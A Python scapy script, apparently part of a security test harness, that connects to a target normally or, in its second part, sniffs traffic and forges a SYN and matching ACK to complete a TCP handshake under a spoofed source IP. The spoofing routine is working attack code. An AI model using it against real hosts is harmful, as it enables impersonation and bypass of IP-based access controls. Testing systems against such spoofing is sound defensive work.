#! /usr/bin/env python3

"""  # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
This file has to be executed using sudo
# # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # """

""" The following function was inspired from https://gist.github.com/cr0hn/1b0c2e672cd0721d3a07
It is modified to fit scapy 2.4.2 and python 3.7, and is shallowed (removed the recursiveness) on purpose for our application
"""
def pktToDict (pkt):
    dictPkt = dict()
    for i in range(len(pkt)):
        try:
            layer = pkt[i]
        except IndexError:
            continue

        # Get layer name
        layer_tmp_name = str(layer.aliastypes[0])
        layer_start_pos = layer_tmp_name.rfind(".") + 1
        layer_name = layer_tmp_name[layer_start_pos:-2].lower()

        # Get the layer info
        tmp_t = dict()
        for x, y in layer.default_fields.items():
            if isinstance(y, (str, int, float)):
                tmp_t[x] = y

        for x, y in layer.fields.items():
            if isinstance(y, (str, int, float, bytes)):
                tmp_t[x] = y
        dictPkt[layer_name] = tmp_t

    return dictPkt

def runSniffer (ethAdaptorName, ipTarget, packets, timeout):
    def storePkt(pkt):
        dictPkt = pktToDict (pkt)
        if ("ip" in dictPkt) and ("dst" in dictPkt['ip']):
            if ( (dictPkt['ip']['src'] == ipTarget) or (dictPkt['ip']['dst'] == ipTarget)):
                packets.append(pkt)

    scapy.sniff(iface=ethAdaptorName, prn=storePkt, timeout=timeout)

def startSniffing (ethAdaptorName, ipTarget, packets, timeout=10):
    threadSniff = threading.Thread(target=runSniffer, args=(ethAdaptorName,ipTarget,packets,timeout))
    threadSniff.daemon = True
    threadSniff.start ()
    print ("\t>>>>>> [host-client-sudo]: sniffing started!\n")
    time.sleep(3)
    return threadSniff

def stopSniffing (threadSniff, packets, timeout=10):
    print ("\n------------ <SNIFF-OUT-START> -------------\n")
    allPackets = packets
    print (f">>>> {len(allPackets)} packets matched.")
    for pkt in allPackets:
        print(pktToDict (pkt))

    threadSniff.join(timeout=timeout-3)
    if (threadSniff.is_alive()):
        print ("WARNING: The sniffing thread is still running.")

    print ("\n------------ <SNIFF-OUT-END> ---------------\n")
    return

def spoofIp (ipTarget, portTarget, spoofingIP, ethAdaptorName, testPart):

    packets = []
    threadSniff = startSniffing(ethAdaptorName, ipTarget, packets, timeout=10)
    message = f"TESTGEN-294-P0{testPart}.0"
    if (testPart == '1'): #part1 -- no spoofing
        print ("\t>>>>>> [host-client-sudo]: Regular operation ...\n")
        try:
            clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            clientSocket.settimeout(20) #blocking operations
            clientSocket.connect((ipTarget,portTarget))
        except:
            print ("\n[host-client-sudo]: INVALID: Failed to connect to target.\n")
            return
        clientSocket.close()
    else: #part2 -- spoofing
        print ("\t>>>>>> [host-client-sudo]: Attempting the spoof...\n")
        #Prepare SYN packet
        xEther = scapy.Ether()
        xIP = scapy.IP(src=spoofingIP, dst=ipTarget)
        xTCP = scapy.TCP(sport=scapy.RandShort(),dport=portTarget,flags="S",seq=scapy.RandShort())
        spoofedSynPkt = xEther / xIP / xTCP
        #send it twice
        xSentPkt = scapy.sendp(spoofedSynPkt,iface=ethAdaptorName,return_packets=True)
        time.sleep(0.5)
        scapy.sendp(xSentPkt,iface=ethAdaptorName)        
        print ("\t>>>>>> [host-client-spoofing]: SYN packet sent!\n")

        startIndex = 0
        ackFound = False
        limitTries = 5
        for iTry in range(limitTries): #try 5 times 
            for iPkt, xPkt in enumerate(packets[startIndex:]):
                synAckPkt = pktToDict(packets[-1])
                if ("ip" in synAckPkt) and ("src" in synAckPkt['ip']) and (synAckPkt['ip']['src'] == ipTarget):
                    print ("\t>>>>>> [host-client-spoofing]: Sniffed the SYN-ACK packet!")
                    try:
                        ackVal = synAckPkt['tcp']['seq'] + 1 #ack is the "seq+1"
                        seqVal = synAckPkt['tcp']['ack'] #seq should be the ack
                        sPort = synAckPkt['tcp']['dport'] #read dport, same port we used to send the SYN
                    except:
                        print ("\n[host-client-sudo]: INVALID: Failed to read the packet parameters.\n")
                        break
                    #Prepare the ACK packet
                    yEther = scapy.Ether()
                    yIP = scapy.IP(src=spoofingIP, dst=ipTarget)
                    yTCP = scapy.TCP(sport=sPort,dport=portTarget,flags="A",seq=seqVal,ack=ackVal)
                    spoofedAckPkt = yEther / yIP / yTCP
                    #send it once
                    scapy.sendp(spoofedAckPkt,iface=ethAdaptorName) 
                    startIndex = iPkt + 1
                    ackFound = True 
                    break
            if (ackFound):
                break
            if (iTry == limitTries-1):
                print ("\n[host-client-sudo]: INVALID: Failed to sniff the SYN-ACK packet.\n")
                break
            time.sleep(2)

    stopSniffing(threadSniff, packets, timeout=10)
    return

if __name__ == '__main__':
    import sys
    if (len(sys.argv) != 7):
        print ("\n<INVAID> [host-client-sudo]: Wrong number of arguments passed to sudo_290.py\n")
        exit (0)
    parentPath = sys.argv[1].split('+')
    sys.path = list(set(sys.path + parentPath))
    import scapy.all as scapy
    import subprocess, threading
    import time
    import socket
    try:
        spoofIp (sys.argv[2], int(sys.argv[3]), sys.argv[4], sys.argv[5], sys.argv[6])
    except:
        print ("\n<INVALID> [host-client-spoofing]: Failed to send a spoofed packet!\n")
    exit (0)